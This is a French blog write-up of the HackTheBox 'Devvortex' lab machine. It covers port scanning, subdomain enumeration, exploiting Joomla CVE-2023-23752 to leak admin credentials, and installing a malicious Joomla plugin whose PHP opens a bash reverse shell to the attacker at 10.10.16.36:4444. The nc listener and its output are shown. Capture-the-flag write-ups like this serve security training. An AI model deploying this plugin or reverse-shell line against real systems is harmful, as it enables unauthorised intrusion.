---
layout: post
title: Devvortex (HTB)
categories: markdown
summary: "Dans ce CTF HackTheBox, nous exploitons une vulnérabilité dans Joomla (CVE-2023-23752) pour accéder à des informations sensibles, puis utilisons une élévation de privilèges via apport-cli (CVE-2023-1326)."
tags: [CTF, Joomla, CVE-2023-23752, CVE-2023-1326, HackTheBox, Cybersecurity]
date: 2023-09-20
---

## Introduction

Dans ce challenge de HackTheBox, nous allons d'abord exploiter une vulnérabilité dans Joomla liée à la divulgation de données sensibles (CVE-2023-23752), puis utiliser une élévation de privilèges via apport-cli (CVE-2023-1326) pour obtenir un accès root.

---

## Vue d'ensemble du service

Pour scanner la machine `10.10.11.242`, nous utilisons rustscan :

```bash
$ wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
$ unzip rustscan_2.1.0_both.zip
$ dpkg -i rustscan_2.1.0_amd64.deb
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.242 -- -A -sC
```

Le résultat du scan nous montre les services ouverts :

| PORT    | ÉTAT     | SERVICE | RAISON           | VERSION                                    |
|---------|----------|---------|------------------|--------------------------------------------|
| 22/tcp  | ouvert   | ssh     | syn-ack ttl 63   | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu)    |
| 80/tcp  | ouvert   | http    | syn-ack ttl 63   | nginx 1.18.0 (Ubuntu)                     |

---

## Service Web

Accéder au service web sur le port 80 nous redirige vers le domaine `devvortex.htb`, donc nous ajoutons cet hôte au fichier `/etc/hosts` :

```bash
$ nano /etc/hosts
10.10.11.242 devvortex.htb
```

Ensuite, nous recherchons les sous-domaines à l'aide de gobuster :

```bash
$ gobuster vhost -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 -k
```

Nous trouvons le sous-domaine `dev.devvortex.htb`, que nous ajoutons également au fichier `/etc/hosts` :

```bash
$ nano /etc/hosts
10.10.11.242 devvortex.htb dev.devvortex.htb
```

Nous recherchons ensuite des répertoires intéressants avec wfuzz :

```bash
$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --sc 202,204,301,302,307,403 http://dev.devvortex.htb/FUZZ
```

Nous identifions plusieurs répertoires intéressants, dont "administrator", ce qui suggère l'utilisation de Joomla.

---

## Identification de la vulnérabilité Joomla

Nous utilisons `joomscan` pour vérifier la version de Joomla et découvrons que la version 4.2.6 est vulnérable à **CVE-2023-23752** :

```bash
$ joomscan --url http://dev.devvortex.htb
```

Nous pouvons exploiter cette vulnérabilité pour divulguer des informations sensibles, telles que les identifiants d'administration :

```bash
$ git clone https://github.com/Acceis/exploit-CVE-2023-23752.git && cd exploit-CVE-2023-23752
$ gem install httpx docopt paint
$ ruby exploit.rb -h
```

En exécutant l'exploit, nous obtenons les identifiants pour l'admin :

```bash
lewis:P4ntherg0t1n5r3c0n##.
```

Nous nous connectons à l'interface d'administration de Joomla.

---

## Configuration du Shell Inverse

Nous créons les fichiers nécessaires pour installer un plugin contenant un shell inverse.

**Fichier `shell.xml`** :

```xml
<?xml version="1.0" encoding="utf-8"?>
<extension version="4.0" type="plugin" group="content">
 <name>plg_content_shell</name>
 <author>1</author>
 <creationDate>December 28, 2021</creationDate>
 <copyright>Free</copyright>
 <authorEmail>1@1.com</authorEmail>
 <authorUrl>http://1.com</authorUrl>
 <version>1.0</version>
 <description>shell</description>
 <files>
  <filename plugin="shell">shell.php</filename>
  <filename>index.html</filename>
 </files>
</extension>
```

**Fichier `shell.php`** :

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'");
defined('_JEXEC') or die;
class plgContentRevShell extends JPlugin
{
  public function onContentAfterTitle($context, &$article, &$params, $limitstart)
    {
      return "<p>Boom!</p>";
    }
}
?>
```

Nous créons également un fichier `index.html` vide.

Ensuite, nous zippons ces trois fichiers :

```bash
$ touch index.html
$ zip revshell.zip shell.xml shell.php index.html
```

Nous téléchargeons le fichier zip via l'interface d'installation de Joomla à l'adresse suivante :

```
http://dev.devvortex.htb/administrator/index.php?option=com_installer&view=install
```

Une fois le plugin installé et activé, nous obtenons notre shell inverse en écoutant sur le port 4444 :

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 36564
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ id
```

---

## Conclusion

Nous avons exploité la vulnérabilité **CVE-2023-23752** pour obtenir des informations sensibles et nous avons configuré un shell inverse pour accéder à la machine. Par la suite, l'exploitation d'une élévation de privilèges via **CVE-2023-1326** nous permettra de prendre le contrôle total de la machine.
````
